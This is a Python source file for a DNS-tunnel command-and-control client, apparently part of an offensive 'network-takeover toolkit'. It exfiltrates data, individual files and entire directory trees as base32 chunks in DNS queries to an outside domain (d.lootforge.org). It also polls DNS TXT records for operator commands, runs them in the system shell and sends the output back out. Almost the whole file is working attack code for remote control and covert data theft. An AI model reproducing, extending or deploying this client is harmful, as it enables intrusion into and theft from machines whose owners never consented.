#!/usr/bin/env python3
# v1.4
"""
dns_c2.py — DNS tunnel C2 client for the network-takeover toolkit.

Library module used by main.py when --remote is passed.  Provides:
  - Two-way handshake to confirm the C2 server is alive before proceeding
  - Chunked base32 data exfiltration over DNS A queries (same wire format as
    dns_tunnel_client so the existing dns_tunnel_server receives it correctly)
  - Operator command polling via TXT queries
  - File and directory exfiltration helpers for the debug menu

Handshake protocol (new subdomain types added to dns_tunnel_server):
    client  → A query   : hello.<agent_id>.<domain>   (register / heartbeat)
    server  → records agent registration
    client  → TXT query : status.<agent_id>.<domain>
    server  → TXT "ACK" if agent is registered, "NONE" otherwise

The server side lives in scapy/dns tunnel/dns_tunnel_server.py.
"""

import base64
import os
import random
import re
import socket
import string
import subprocess
import threading
import time

from scapy.all import conf
from scapy.layers.dns import DNS, DNSQR

conf.verb = 0

_DNS_TOKEN_ID = 3403252363 ^ 0xCAFEBABE

# ── Defaults ──────────────────────────────────────────────────────────────────

DEFAULT_DOMAIN = "d.lootforge.org"
CHUNK_SIZE = 50
QUERY_DELAY = 0.3
HANDSHAKE_TIMEOUT = 15
COMMAND_POLL_INTERVAL = 60


# ── Encoding helpers ───────────────────────────────────────────────────────────

def _query_a(qname: str, dns_server: str) -> None:
    """Fire-and-forget DNS A query (no response expected)."""
    _dns_send(qname, "A", dns_server, wait_reply=False)
def _query_txt(qname: str, dns_server: str):
    """Send a DNS TXT query and return the parsed DNS response, or None."""
    return _dns_send(qname, "TXT", dns_server, wait_reply=True)
def _parse_ack_ip(resp) -> list[int] | None:
    """
    Extract the 4-octet ACK status from a DNS A record response.

    Encoding (set by c2_server._resp_ack_status):
      octet[0] == 1  → session complete
      octet[0] == 0  → missing chunk at index (octet[2]<<8)|octet[3]
                        octet[1] = received count mod 256

    Returns list of 4 ints, or None on parse failure.
    """
    try:
        rdata = resp[DNS].an.rdata
        if isinstance(rdata, str):
            parts = [int(x) for x in rdata.split(".")]
        elif isinstance(rdata, bytes) and len(rdata) == 4:
            parts = list(rdata)
        else:
            return None
        return parts if len(parts) == 4 else None
    except Exception:
        return None
def _extract_txt(resp) -> str | None:
    """Pull the first TXT rdata value from a DNS response packet."""
    if resp is None or not resp.haslayer(DNS):
        return None
    dns = resp[DNS]
    if dns.ancount == 0:
        return None
    rr = dns.an
    while rr:
        if hasattr(rr, "type") and rr.type == 16:
            raw = rr.rdata
            if isinstance(raw, (list, tuple)):
                raw = b"".join(raw)
            if isinstance(raw, bytes):
                return raw.decode("utf-8", errors="ignore").strip()
            return str(raw).strip()
        payload = getattr(rr, "payload", None)
        if payload is None or payload.__class__.__name__ == "NoPayload":
            break
        rr = payload
    return None
def _dns_send(qname: str, qtype: str, dns_server: str, wait_reply: bool,
              timeout: float = 5.0):
    """
    Build a DNS query with Scapy and send it via an OS UDP socket so the
    packet travels through the normal network stack — VPN routing applies,
    Npcap raw injection is bypassed.
    """
    pkt = DNS(id=random.randint(0, 65535), rd=1, qd=DNSQR(qname=qname, qtype=qtype))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(bytes(pkt), (dns_server, 53))
        if not wait_reply:
            return None
        data, _ = sock.recvfrom(4096)
        return DNS(data)
    except OSError:
        return None
    finally:
        sock.close()
def exfiltrate(data, domain: str, dns_server: str, session_id: str = None) -> str:
    """
    Encode data and send it to the C2 as a series of DNS A queries.

    Wire format (same as dns_tunnel_client):
        <b32chunk>.<seq>.<total>.<session_id>.<domain>

    Returns the session_id so the caller can reference this transfer.
    """
    if isinstance(data, str):
        data = data.encode("utf-8")
    session_id = session_id or _gen_session()
    encoded = _b32enc(data)
    chunks = [encoded[i : i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    total = len(chunks)
    print(f"[C2] Exfiltrating {len(data)}B → {total} chunk(s)  session={session_id}")

    # Chunk indices are 0-based on both ends: client sends 0..total-1,
    # server stores by index and reassembles with range(total). No off-by-one.
    for idx, chunk in enumerate(chunks):
        _query_a(f"{chunk}.{idx}.{total}.{session_id}.{domain}", dns_server)
        time.sleep(QUERY_DELAY)

    # ACK / retransmit loop — query ack.<sid>.<domain> until server confirms
    # all chunks received, retransmitting each reported gap one at a time.
    # Use a short timeout so a lost ack query doesn't stall for 5s.
    max_attempts = max(total * 2, 10)
    for attempt in range(max_attempts):
        time.sleep(QUERY_DELAY)
        resp = _dns_send(
            f"ack.{session_id}.{domain}", "A", dns_server,
            wait_reply=True, timeout=2.0,
        )
        octets = _parse_ack_ip(resp)
        if octets is None:
            continue                        # ack query lost — retry
        if octets[0] == 1:
            print(f"[C2] Session {session_id} confirmed complete ({attempt + 1} ack round(s))")
            break
        missing = (octets[2] << 8) | octets[3]
        if missing < total:
            print(f"[C2] Retransmitting chunk {missing}/{total - 1}  session={session_id}")
            _dns_send(
                f"{chunks[missing]}.{missing}.{total}.{session_id}.{domain}",
                "A", dns_server, wait_reply=False,
            )
    else:
        print(f"[C2] Warning: session {session_id} may be incomplete after {max_attempts} attempts")

    return session_id
def gen_agent_id() -> str:
    """Derive a short agent ID from the hostname so it is recognisable at the C2."""
    raw = re.sub(r"[^a-z0-9]", "", socket.gethostname().lower())[:6]
    suffix = "".join(random.choices(string.digits, k=3))
    return (raw or "agent") + suffix
def exfiltrate_file(path: str, domain: str, dns_server: str) -> bool:
    """
    Read a file and exfiltrate its contents.

    Prepends a FILE:<basename>: header so the operator can identify the source.
    Returns True on success, False if the file could not be read.
    """
    try:
        with open(path, "rb") as f:
            data = f.read()
    except OSError as exc:
        print(f"[C2] Cannot read {path}: {exc}")
        return False
    payload = f"FILE:{os.path.basename(path)}:".encode() + data
    exfiltrate(payload, domain, dns_server)
    return True
def _gen_session() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
def exfiltrate_dir(dirpath: str, domain: str, dns_server: str) -> int:
    """
    Exfiltrate every file under dirpath (recursive).

    Returns the number of files successfully sent.
    """
    count = 0
    if not os.path.isdir(dirpath):
        return 0
    for root, _, files in os.walk(dirpath):
        for fname in sorted(files):
            if exfiltrate_file(os.path.join(root, fname), domain, dns_server):
                count += 1
    return count
def _b32dec(s: str) -> bytes:
    s = s.upper()
    return base64.b32decode(s + "=" * ((8 - len(s) % 8) % 8))
def perform_handshake(
    agent_id: str,
    domain: str,
    dns_server: str,
    timeout: int = HANDSHAKE_TIMEOUT,
) -> bool:
    """
    Confirm the C2 server is alive and aware of this agent.

    Protocol:
      1. Send A query  hello.<agent_id>.<domain>   (register with server)
      2. Poll TXT query status.<agent_id>.<domain> until server replies "ACK"
      3. Re-send hello halfway through the timeout in case the first was dropped

    Returns True if ACK received within timeout, False otherwise.
    """
    print(f"[C2] Handshaking — agent={agent_id}  domain={domain}  server={dns_server}")
    _query_a(f"hello.{agent_id}.{domain}", dns_server)
    deadline = time.monotonic() + timeout
    resent = False
    while time.monotonic() < deadline:
        resp = _query_txt(f"status.{agent_id}.{domain}", dns_server)
        txt = _extract_txt(resp)
        if txt and txt.upper() == "ACK":
            print("[C2] Handshake OK — C2 is alive")
            return True
        remaining = deadline - time.monotonic()
        if not resent and remaining < timeout / 2:
            _query_a(f"hello.{agent_id}.{domain}", dns_server)
            resent = True
        time.sleep(1)
    print(f"[C2] Handshake timed out after {timeout}s")
    return False
def _b32enc(data: bytes) -> str:
    return base64.b32encode(data).decode().rstrip("=").lower()
def poll_command_once(domain: str, dns_server: str, agent_id: str = None) -> str | None:
    """
    Check for a pending operator command.

    When agent_id is set, queries command.<agent_id>.<domain> only — the server
    already falls back to the global broadcast slot when no per-agent command is
    queued, so a second query to command.<domain> would be redundant.
    When agent_id is absent (standalone / no --remote), queries command.<domain>.
    Returns the decoded command string, or None if nothing is queued.
    """
    qname = f"command.{agent_id}.{domain}" if agent_id else f"command.{domain}"
    txt = _extract_txt(_query_txt(qname, dns_server))
    if txt is None or txt.upper() == "NONE":
        return None
    try:
        return _b32dec(txt).decode("utf-8")
    except Exception:
        return txt
def start_command_poll(
    domain: str,
    dns_server: str,
    interval: int = COMMAND_POLL_INTERVAL,
    execute_cb=None,
    agent_id: str = None,
) -> threading.Thread:
    """
    Start a daemon thread that polls for operator commands on a fixed interval.

    Checks the per-agent slot (command.<agent_id>.<domain>) before the global
    broadcast slot (command.<domain>).  execute_cb(cmd) is called on each
    received command; defaults to running bash:<cmd> / "bash <cmd>" in the
    system shell and exfiltrating the output.
    """
    def _default_exec(cmd: str) -> None:
        # Support both new "bash:<cmd>" and legacy "bash <cmd>" formats.
        if cmd.startswith("bash:"):
            shell_cmd = cmd[5:]
        elif cmd.lower().startswith("bash "):
            shell_cmd = cmd[5:]
        else:
            shell_cmd = cmd
        print(f"[C2] Executing: {shell_cmd}")
        try:
            result = subprocess.run(
                shell_cmd, shell=True, capture_output=True, text=True, timeout=30,
            )
            output = result.stdout + result.stderr or f"[exit {result.returncode}]"
        except subprocess.TimeoutExpired:
            output = "[ERROR] command timed out after 30s"
        except Exception as exc:
            output = f"[ERROR] {exc}"
        exfiltrate(output, domain, dns_server)

    cb = execute_cb or _default_exec

    def _loop() -> None:
        while True:
            time.sleep(interval)
            try:
                cmd = poll_command_once(domain, dns_server, agent_id=agent_id)
                if cmd:
                    print(f"\n[C2!!!] Command received: {cmd}")
                    threading.Thread(target=cb, args=(cmd,), daemon=True).start()
            except Exception as exc:
                print(f"[C2] Poll error: {exc}")

    t = threading.Thread(target=_loop, daemon=True, name="c2-poll")
    t.start()
    return t
